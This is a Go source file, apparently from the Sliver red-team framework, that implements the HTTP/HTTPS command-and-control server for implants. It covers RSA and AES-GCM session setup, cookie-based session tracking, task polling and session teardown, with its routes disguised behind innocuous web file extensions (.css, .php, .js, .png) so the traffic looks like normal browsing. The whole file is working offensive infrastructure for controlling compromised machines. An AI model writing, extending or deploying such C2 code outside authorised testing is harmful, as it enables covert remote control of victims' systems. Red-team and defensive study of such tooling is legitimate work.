package c2

import (
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"encoding/pem"
	"io/ioutil"
	"log"
	"net/http"
	consts "sliver/client/constants"
	"sliver/server/assets"
	"sliver/server/certs"
	"sliver/server/core"
	"sliver/server/cryptography"
	"sliver/server/encoders"
	"sync"
	"time"

	sliverpb "sliver/protobuf/sliver"
	sliverHandlers "sliver/server/handlers"

	"github.com/golang/protobuf/proto"
	"github.com/gorilla/mux"
)

const (
	defaultHTTPTimeout = time.Second * 60
	pollTimeout        = defaultHTTPTimeout - 5
)

var (
	cookieEncoders = map[string]encoders.ASCIIEncoder{
		"JSESSIONID": encoders.Hex{},
		"SESSIONID":  encoders.Base64{},
	}
)

// HTTPSession - Holds data related to a sliver c2 session
type HTTPSession struct {
	ID          string
	Sliver      *core.Sliver
	Key         cryptography.AESKey
	LastCheckin time.Time
	replay      map[string]bool // Sessions are mutex'd
}

// Keeps a hash of each msg in a session to detect replay'd messages
func (s *HTTPSession) isReplayAttack(ciphertext []byte) bool {
	if len(ciphertext) < 1 {
		return false
	}
	sha := sha256.New()
	sha.Write(ciphertext)
	digest := base64.RawStdEncoding.EncodeToString(sha.Sum(nil))
	if _, ok := s.replay[digest]; ok {
		return true
	}
	s.replay[digest] = true
	return false
}

type httpSessions struct {
	sessions *map[string]*HTTPSession
	mutex    *sync.RWMutex
}

func (s *httpSessions) Add(session *HTTPSession) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	(*s.sessions)[session.ID] = session
}

func (s *httpSessions) Get(sessionID string) *HTTPSession {
	s.mutex.RLock()
	defer s.mutex.RUnlock()
	return (*s.sessions)[sessionID]
}

func (s *httpSessions) Remove(sessionID string) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	delete((*s.sessions), sessionID)
}

// HTTPHandler - Path mapped to a handler function
type HTTPHandler func(resp http.ResponseWriter, req *http.Request)

// HTTPServerConfig - Config data for servers
type HTTPServerConfig struct {
	Addr     string
	LPort    uint16
	Domain   string
	Secure   bool
	CertPath string
	KeyPath  string
}

// SliverHTTPC2 - Holds refs to all the C2 objects
type SliverHTTPC2 struct {
	HTTPServer *http.Server
	Conf       *HTTPServerConfig
	Sessions   *httpSessions
}

// StartHTTPSListener - Start a mutual TLS listener
func StartHTTPSListener(conf *HTTPServerConfig) *SliverHTTPC2 {
	log.Printf("Starting https listener on '%s'", conf.Addr)
	server := &SliverHTTPC2{
		Conf: conf,
		Sessions: &httpSessions{
			sessions: &map[string]*HTTPSession{},
			mutex:    &sync.RWMutex{},
		},
	}
	server.HTTPServer = &http.Server{
		Addr:         conf.Addr,
		Handler:      server.router(),
		WriteTimeout: defaultHTTPTimeout,
		ReadTimeout:  defaultHTTPTimeout,
		IdleTimeout:  defaultHTTPTimeout,
		TLSConfig: &tls.Config{
			MinVersion:               tls.VersionTLS12,
			CurvePreferences:         []tls.CurveID{tls.CurveP521, tls.CurveP384, tls.CurveP256},
			PreferServerCipherSuites: true,
			CipherSuites: []uint16{
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
				tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_RSA_WITH_AES_256_CBC_SHA,
			},
		},
		TLSNextProto: make(map[string]func(*http.Server, *tls.Conn, http.Handler), 0),
	}
	return server
}

// StartHTTPListener - Start a mutual TLS listener
func StartHTTPListener(conf *HTTPServerConfig) *SliverHTTPC2 {
	log.Printf("Starting http listener on '%s'", conf.Addr)
	server := &SliverHTTPC2{
		Conf: conf,
		Sessions: &httpSessions{
			sessions: &map[string]*HTTPSession{},
			mutex:    &sync.RWMutex{},
		},
	}
	server.HTTPServer = &http.Server{
		Addr:         conf.Addr,
		Handler:      server.router(),
		WriteTimeout: defaultHTTPTimeout,
		ReadTimeout:  defaultHTTPTimeout,
		IdleTimeout:  defaultHTTPTimeout,
	}
	return server
}

func (s *SliverHTTPC2) router() *mux.Router {
	router := mux.NewRouter()

	// Procedural C2
	// ===============
	// .txt = rsakey
	// .css = start
	// .php = session
	//  .js = poll
	// .png = stop

	router.HandleFunc("/{rpath:.*\\.txt$}", s.rsaKeyHandler).Methods("GET")
	router.HandleFunc("/{rpath:.*\\.css$}", s.startSessionHandler).Methods("GET", "POST")
	router.HandleFunc("/{rpath:.*\\.php$}", s.sessionHandler).Methods("GET", "POST")
	router.HandleFunc("/{rpath:.*\\.js$}", s.pollHandler).Methods("GET")
	router.HandleFunc("/{rpath:.*\\.png$}", s.stopHandler).Methods("GET")

	router.Use(loggingMiddleware)

	return router
}

func loggingMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(resp http.ResponseWriter, req *http.Request) {
		log.Printf("[http] %v", req.RequestURI)
		next.ServeHTTP(resp, req)
	})
}

// [ HTTP Handlers ] ---------------------------------------------------------------

func (s *SliverHTTPC2) rsaKeyHandler(resp http.ResponseWriter, req *http.Request) {
	rootDir := assets.GetRootAppDir()
	certPEM, _, _ := certs.GetServerRSACertificatePEM(rootDir, "slivers", s.Conf.Domain, true)
	resp.Write(certPEM)
}

func (s *SliverHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.Request) {
	rootDir := assets.GetRootAppDir()
	publicKeyPEM, privateKeyPEM, err := certs.GetServerRSACertificatePEM(rootDir, "slivers", s.Conf.Domain, false)
	if err != nil {
		log.Printf("[http] Failed to fetch rsa private key")
		resp.WriteHeader(404)
		return
	}

	// RSA decrypt request body
	publicKeyBlock, _ := pem.Decode([]byte(publicKeyPEM))
	log.Printf("[http] RSA Fingerprint: %s", fingerprintSHA256(publicKeyBlock))
	privateKeyBlock, _ := pem.Decode([]byte(privateKeyPEM))
	privateKey, _ := x509.ParsePKCS1PrivateKey(privateKeyBlock.Bytes)
	buf, _ := ioutil.ReadAll(req.Body)
	sessionInitData, err := cryptography.RSADecrypt(buf, privateKey)
	if err != nil {
		log.Printf("[http] RSA decryption failed")
		resp.WriteHeader(404)
		return
	}
	sessionInit := &sliverpb.HTTPSessionInit{}
	proto.Unmarshal(sessionInitData, sessionInit)

	session := newSession()
	session.Key, _ = cryptography.AESKeyFromBytes(sessionInit.Key)
	session.Sliver = &core.Sliver{
		ID:            core.GetHiveID(),
		Transport:     "http(s)",
		RemoteAddress: req.RemoteAddr,
		Send:          make(chan *sliverpb.Envelope, 16),
		RespMutex:     &sync.RWMutex{},
		Resp:          map[uint64]chan *sliverpb.Envelope{},
	}
	core.Hive.AddSliver(session.Sliver)
	s.Sessions.Add(session)
	log.Printf("Started new session with id %s", session.ID)

	data, err := cryptography.GCMEncrypt(session.Key, []byte(session.ID))
	if err != nil {
		log.Printf("[http] Failed to encrypt session identifier")
		resp.WriteHeader(404)
		return
	}
	// encoderName, encodedData := s.cookieEncoder(data)
	http.SetCookie(resp, &http.Cookie{
		Domain:   s.Conf.Domain,
		Name:     "sessionid",
		Value:    session.ID,
		Secure:   true,
		HttpOnly: true,
	})
	resp.Write(data)
}

func (s *SliverHTTPC2) sessionHandler(resp http.ResponseWriter, req *http.Request) {

	session := s.getSession(req)
	if session == nil {
		log.Printf("[http] No session with id %#v", session.ID)
		resp.WriteHeader(403)
		return
	}

	data, _ := ioutil.ReadAll(req.Body)
	if session.isReplayAttack(data) {
		log.Printf("[http] WARNING: Replay attack detected")
		resp.WriteHeader(404)
		return
	}
	body, err := cryptography.GCMDecrypt(session.Key, data)
	if err != nil {
		log.Printf("[http] GCM decryption failed %v", err)
		resp.WriteHeader(404)
		return
	}
	envelope := &sliverpb.Envelope{}
	proto.Unmarshal(body, envelope)

	handlers := sliverHandlers.GetSliverHandlers()
	if envelope.ID != 0 {
		session.Sliver.RespMutex.RLock()
		defer session.Sliver.RespMutex.RUnlock()
		if resp, ok := session.Sliver.Resp[envelope.ID]; ok {
			resp <- envelope
		}
	} else if handler, ok := handlers[envelope.Type]; ok {
		handler.(func(*core.Sliver, []byte))(session.Sliver, envelope.Data)
	}
	resp.WriteHeader(200)
	// TODO: Return random data?
}

func (s *SliverHTTPC2) pollHandler(resp http.ResponseWriter, req *http.Request) {
	session := s.getSession(req)
	if session == nil {
		log.Printf("[http] No session with id %#v", session.ID)
		resp.WriteHeader(403)
		return
	}

	select {
	case envelope := <-session.Sliver.Send:
		resp.WriteHeader(200)
		envelopeData, _ := proto.Marshal(envelope)
		data, _ := cryptography.GCMEncrypt(session.Key, envelopeData)
		resp.Write(data)
	case <-time.After(pollTimeout):
		log.Printf("Poll time out")
		resp.WriteHeader(201)
		resp.Write([]byte{})
	}
}

func (s *SliverHTTPC2) stopHandler(resp http.ResponseWriter, req *http.Request) {
	session := s.getSession(req)
	if session == nil {
		log.Printf("[http] No session with id %#v", session.ID)
		resp.WriteHeader(403)
		return
	}

	nonce := []byte(req.URL.Query().Get("nonce"))
	if session.isReplayAttack(nonce) {
		log.Printf("[http] WARNING: Replay attack detected")
		resp.WriteHeader(404)
		return
	}
	_, err := cryptography.GCMDecrypt(session.Key, nonce)
	if err != nil {
		log.Printf("[http] GCM decryption failed %v", err)
		resp.WriteHeader(404)
		return
	}

	core.Hive.RemoveSliver(session.Sliver)
	core.EventBroker.Publish(core.Event{
		EventType: consts.DisconnectedEvent,
		Sliver:    session.Sliver,
	})
	s.Sessions.Remove(session.ID)

	resp.WriteHeader(200)
}

func (s *SliverHTTPC2) getSession(req *http.Request) *HTTPSession {
	for _, cookie := range req.Cookies() {
		log.Printf("[http] Cookie: %#v", cookie)
		if cookie.Name == "sessionid" {
			session := s.Sessions.Get(cookie.Value)
			if session != nil {
				session.LastCheckin = time.Now()
				return session
			}
			return nil
		}
	}
	return nil // No valid cookie names
}

func (s *SliverHTTPC2) cookieEncoder(data []byte) (string, string) {
	name, encoder := randomCookieEncoder()
	return name, encoder.Encode(data)
}

func randomCookieEncoder() (string, encoders.ASCIIEncoder) {
	for k, v := range cookieEncoders {
		return k, v
	}
	return "", nil
}

func newSession() *HTTPSession {
	return &HTTPSession{
		ID:          newHTTPSessionID(),
		LastCheckin: time.Now(),
		replay:      map[string]bool{},
	}
}

// newHTTPSessionID - Get a 128bit session ID
func newHTTPSessionID() string {
	buf := make([]byte, 16)
	rand.Read(buf)
	return hex.EncodeToString(buf)
}
